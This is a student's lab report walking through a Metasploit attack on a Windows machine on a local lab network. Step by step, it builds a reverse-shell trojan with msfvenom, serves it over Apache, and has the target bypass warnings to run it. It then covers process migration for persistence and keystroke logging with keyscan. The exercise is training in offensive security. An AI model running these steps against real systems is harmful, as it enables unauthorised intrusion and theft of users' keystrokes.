## REG.NO:212222110050
## NAME:SWETHA N
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![325066504-e3b4e8ad-0744-41da-bf0e-00af2819b316](https://github.com/user-attachments/assets/621bd19b-6dad-4d04-8a2e-714f38b3c807)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![325067463-e5f93487-fe4d-4ca2-ae87-40528759b8ca](https://github.com/user-attachments/assets/c2167662-b9d3-44c2-bc4e-9604935a2745)
copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![325067418-a7061eec-78cb-4924-8bfd-750819217ae4](https://github.com/user-attachments/assets/409295c1-b52c-433d-ad7a-756eddd562ef)
Start apache server sudo systemctl apache2 start

## OUTPUT:
![325067343-94f19b88-677c-4e52-9f3e-9c0692c1b517](https://github.com/user-attachments/assets/759bb388-5801-43ba-bd9d-2b2f5964605d)
Check the status of apache2

## OUTPUT:
![325067309-b0acfb58-3df4-4054-94b9-cbee552a7016](https://github.com/user-attachments/assets/2e43902d-b353-4faf-b2e4-19fbb6f74085)
Invoke msfconsole:

## OUTPUT:
msfconsole
![325067216-44262e98-e486-48b5-ac0b-a46ce64aea0e](https://github.com/user-attachments/assets/af469f20-26e3-4026-95c3-2280bd18af4b)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![325067173-df212ae7-e067-4020-8c25-1c0aa43b59e7](https://github.com/user-attachments/assets/e235bcb6-ac32-4f7b-aee8-3331164e3b06)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css
![325067134-8e273f1c-0127-4bf3-84fb-fb78e9c6ac90](https://github.com/user-attachments/assets/247e416c-4cf7-4e7d-9931-96927cacd2a7)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![325067076-70a3b4d8-0dcc-4370-9fcd-2c3677d0895e](https://github.com/user-attachments/assets/0a4ad34e-4a31-4cc4-8da7-a6d159b3b341)

Bypass any warning boxes, double-click the file, and allow it to run.
![325067042-e8a7eea1-3cc6-4ecb-958f-fde637a7fae8](https://github.com/user-attachments/assets/b0f3b60e-a00a-4391-b066-ebb0071e4656)

On kali give the command exploit
![325067013-65425abf-0758-4378-8135-3ff71f48e582](https://github.com/user-attachments/assets/c65e5432-c55a-4cd1-961b-3c5d82b9cdf0)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![325066983-5d0014c5-4c05-4600-9961-06a15007e0f3](https://github.com/user-attachments/assets/104aa709-3f8b-45ff-8281-5d4d55e69f94)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![325066956-f67156a4-303a-46e8-988b-f6cfedf969a8](https://github.com/user-attachments/assets/70fe5f55-633f-4d77-a2cd-d02d81e08b88)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![325066903-e6b6fbc1-4c4c-4e14-a3d8-10249cff2969](https://github.com/user-attachments/assets/9ef07677-5f3d-4b65-b3df-9d96bef22def)

![325066935-a33bbc37-38ac-45b3-b0a3-fd26b82ed9ab](https://github.com/user-attachments/assets/0b2ec218-ad45-4270-a259-94ac916b97e1)

keyscan_dump Shows the keystrokes captured so far

![325066872-4f311cb3-83cd-4564-a90b-590e1397a284](https://github.com/user-attachments/assets/059102eb-e543-4af3-a784-591c3acc97e4)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
